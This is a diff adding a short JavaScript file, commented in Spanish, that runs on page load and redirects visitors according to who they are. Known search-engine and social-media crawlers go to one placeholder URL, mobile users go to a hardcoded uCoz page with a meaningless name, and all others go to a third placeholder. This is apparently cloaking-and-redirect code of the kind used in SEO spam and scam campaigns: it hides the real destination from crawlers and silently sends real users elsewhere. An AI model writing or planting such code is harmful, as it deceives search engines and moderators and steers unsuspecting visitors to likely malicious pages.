@@ -1,0 +1,42 @@
+(function() {
+  const botsConocidos = [
+    "adsbot-google", "applebot", "baiduspider", "bingbot", "blekkobot", "Embedly", "facebookexternalhit",
+    "Facebot", "feedfetcher-google", "feedly", "FlipboardProxy", "google web preview", "googlebot",
+    "googlebot-news", "google-inspectiontool", "googleother", "GrapeshotCrawler", "linkedinbot", "mail.ru_bot",
+    "mediapartners-google", "msnbot_mobile", "msnbot", "msnbot", "pinterest", "Seznam", "SkypeUriPreview",
+    "slurp", "storebot-google", "superfeedr bot", "tumblr", "twitterbot", "yandex", "prerender"
+  ];
+
+  function esBot(userAgent) {
+    return botsConocidos.some(bot => userAgent.toLowerCase().includes(bot.toLowerCase()));
+  }
+
+  function esDispositivoMovil(userAgent) {
+    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
+  }
+
+  function esResolucionMovil() {
+    const anchoPantalla = window.screen.width;
+    const altoPantalla = window.screen.height;
+    const anchoMaxMovil = 768; // Ajusta según tus necesidades
+    const anchoMaxTablet = 1024; // Ajusta según tus necesidades
+    return (anchoPantalla <= anchoMaxMovil || altoPantalla <= anchoMaxMovil);
+  }
+
+  function redirigirURL() {
+    const userAgent = navigator.userAgent;
+
+    if (esBot(userAgent)) {
+      // Reemplaza 'URL_ts' con la URL a la que deseas redirigir si es un bot
+      window.location.replace('URL_ts');
+    } else if (esDispositivoMovil(userAgent) && esResolucionMovil()) {
+      // Reemplaza 'http://appsites.ucoz.co.uk/vacansdfdfg.html' con la URL a la que deseas redirigir para dispositivos móviles
+      window.location.replace('http://appsites.ucoz.co.uk/vacansdfdfg.html');
+    } else {
+      // Reemplaza 'URL_p' con la URL a la que deseas redirigir en otros casos
+      window.location.replace('URL_p');
+    }
+  }
+
+  document.addEventListener('DOMContentLoaded', redirigirURL);
+})();
